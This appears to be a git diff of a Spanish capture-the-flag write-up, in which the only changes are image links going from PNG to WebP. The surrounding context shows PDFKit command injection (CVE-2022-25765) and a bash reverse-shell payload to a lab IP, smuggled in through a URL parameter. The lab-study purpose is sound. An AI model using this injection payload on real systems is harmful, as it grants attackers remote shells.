@@ -5,7 +5,7 @@ Propiedades:
 - Tags: #metadatos #exiftool #ruby-deserialization #pdfkit  #CVE-2022-25765 
  
 
-![](assets/Pasted%20image%2020251214223417.png)
+![](assets/Pasted%20image%2020251214223417.webp)
 ## Reconocimiento
 
 Comenzamos tirando un ping para comprobar conectividad.
@@ -62,7 +62,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 - La pagina convierte paginas web en pdfs.
 
-![](assets/Pasted%20image%2020251214224017.png)
+![](assets/Pasted%20image%2020251214224017.webp)
 
 Para probar la pagina me cree un archivo `html` en mi maquina.
 
@@ -79,7 +79,7 @@ Y levante un servidor en python
 
 Coloque la url de mi servidor en la pagina.
 
-![](assets/Pasted%20image%2020251214233528.png)
+![](assets/Pasted%20image%2020251214233528.webp)
 
 Y automáticamente me descargo un `pdf` con un nombre largo
 
@@ -113,11 +113,11 @@ Al parecer si en el parametro colocamos algun carácter `URL Encodeado` en este 
 - [Command Injection Documentation](https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795)
 - Con nuestro servidor de python corriendo podemos colocar nuestra url con algun parametro y el comando `id` para ver si nos lo interpreta.
 
-![](assets/Pasted%20image%2020251215010421.png)
+![](assets/Pasted%20image%2020251215010421.webp)
 
 Podemos ver que el comando si se ejecuto:
 
-![](assets/Pasted%20image%2020251215010841.png)
+![](assets/Pasted%20image%2020251215010841.webp)
 
 También podemos ver el output en los logs de nuestro servidor python
 
@@ -141,7 +141,7 @@ Por lo cual ahora podemos tratar de entablarnos una reverse-shell.
 http://<TUIP>/?lol=%20`bash -c "bash -i >& /dev/tcp/10.10.15.110/443 0>&1"`
 ```
 
-![](assets/Pasted%20image%2020251215011120.png)
+![](assets/Pasted%20image%2020251215011120.webp)
 
 
 Y recibimos la conexion.
@@ -350,4 +350,4 @@ cat root.txt
 
 ***PWNED***
 
-![](assets/Pasted%20image%2020251214233232.png)
+![](assets/Pasted%20image%2020251214233232.webp)
